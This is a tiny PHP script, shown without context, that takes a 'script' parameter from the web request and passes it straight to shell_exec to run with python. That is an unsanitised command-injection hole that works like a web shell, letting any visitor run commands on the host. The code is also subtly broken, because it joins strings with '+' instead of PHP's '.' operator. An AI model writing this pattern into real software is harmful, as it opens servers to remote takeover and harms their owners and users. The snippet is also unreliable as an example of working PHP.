<?php
if (isset($_GET['script'])){
    echo shell_exec('python ' + $_GET['script']);
}
